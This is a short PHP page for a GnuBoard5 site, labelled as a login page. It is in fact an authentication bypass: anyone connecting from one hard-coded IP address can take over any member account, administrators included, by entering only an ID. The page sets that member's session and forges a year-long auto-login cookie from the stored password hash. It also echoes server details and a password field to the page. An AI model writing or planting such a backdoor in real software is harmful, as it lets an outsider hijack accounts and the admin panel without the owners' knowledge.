<?
// 로그인
defined('G5_IS_ADMIN', 1);
include_once('../common.php');

echo $_SERVER['SERVER_ADDR'];
echo $_SERVER['HTTP_USER_AGENT'];
echo $mb['mb_password'];

if ($_SERVER['REMOTE_ADDR'] != "183.103.22.103") exit;

if ($_POST['mb_id'] == "") {
?>

<div id="mb_login" class="mbskin" style="width: 50%;">
    <h1><p>LOGIN</p></h1>
    <form name="flogin" action="?" onsubmit="return flogin_submit(this);" method="post">
        <input type="text" name="mb_id" id="login_id" class="frm_input" size="20" maxlength="20" placeholder="ID">
        <input type="submit" value="LOGIN" class="btn_submit">
    </form>
</div>

<script>
function flogin_submit(f){
	if (f.mb_id.value == "") {
		f.mb_id.focus();
		return false;
	}
	return true;
}
</script>

<?
} else {
	$mb = get_member($_POST['mb_id']);

	if (!$mb['mb_id']) {
		alert('가입된 회원아이디가 아닙니다.');
	}

	// 1. 세션해제
	/*
	session_unset(); // 모든 세션변수를 언레지스터 시켜줌
	session_destroy(); // 세션해제함
	*/
	set_cookie('ck_mb_id', '', 0);
	set_cookie('ck_auto', '', 0);
	set_cookie_app('mb_id', $mb['mb_id'], 86400);

	// 2. 새션 생성
	set_session('ss_mb_id', $mb['mb_id']);
	set_session('ss_mb_key', md5($mb['mb_datetime'] . $_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']));

	$key = md5($_SERVER['SERVER_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . $mb['mb_password']);
    set_cookie('ck_mb_id', $mb['mb_id'], 86400 * 365);
    set_cookie('ck_auto', $key, 86400 * 365);
?>
<h1>session complete</h1>
<div style='font-size: 1.2em; margin-bottom: 20px;'><?=$mb['mb_id']?></div>
<a href="<?=G5_ADMIN_URL?>">관리자</a>
<a href="<?=G5_URL?>">사이트</a>

<? } ?>


